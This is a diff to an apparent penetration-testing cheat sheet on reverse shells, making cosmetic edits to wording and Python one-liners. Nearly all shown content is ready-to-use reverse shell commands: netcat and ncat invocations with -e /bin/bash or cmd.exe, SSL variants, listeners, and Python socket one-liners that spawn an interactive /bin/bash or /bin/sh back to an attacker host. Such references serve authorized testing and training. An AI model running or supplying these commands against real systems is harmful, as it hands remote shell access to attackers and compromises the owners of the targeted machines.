@@ -1,5 +1,5 @@
 # Reverse Shells
-In provided commands/code: replace [HOST] (host receiving the reverse shell connection: Kali VM IP address) and [PORT] (listening port on the host receiving the reverse shell connection) values accordingly
+In provided commands/code: replace ```[HOST]``` (host receiving the reverse shell connection: Kali VM IP address) and ```[PORT]``` (listening port on the host receiving the reverse shell connection) values accordingly
 
 **IMPORTANT NOTE:** Continued use of a reverse shell on a compromised system is not always necessary! If the user running the shell can be used to login to the system remotely, this is preferred as it is more stable and more easily repeatable.
 
@@ -88,7 +88,7 @@ nc.exe -nv -e cmd.exe [HOST] [PORT]
 --sctp: use SCTP instead of TCP
 ```
 
-### Listener (clear-text)
+### Listener (cleartext)
 ```
 ncat -nvlp [PORT]
 ```
@@ -104,7 +104,7 @@ ncat --ssl -nvlp [PORT]
 ncat.exe --ssl -nvlp [PORT]
 ```
 
-### *nix (clear-text)
+### *nix (cleartext)
 ```
 ncat -nv -e /bin/bash [HOST] [PORT]
 ```
@@ -120,7 +120,7 @@ ncat -nv --ssl -e /bin/bash [HOST] [PORT]
 ncat -nv --ssl -e /bin/sh [HOST] [PORT]
 ```
 
-### Windows (clear-text)
+### Windows (cleartext)
 ```
 ncat.exe -nv -e cmd.exe [HOST] [PORT]
 ```
@@ -183,22 +183,22 @@ sbd.exe -nv -e cmd.exe [HOST] [PORT]
 
 ### *nix with bash (shell runs in background and does NOT halt subsequent execution)
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/bash","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/bash","-i"])'
 ```
 
 ### *nix with sh (shell runs in background and does NOT halt subsequent execution)
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"])'
 ```
 
 ### *nix with bash (shell runs in foreground and halts subsequent execution until shell is terminated)
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
 ```
 
 ### *nix with sh (shell runs in foreground and halts subsequent execution until shell is terminated)
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
 ```
 
 
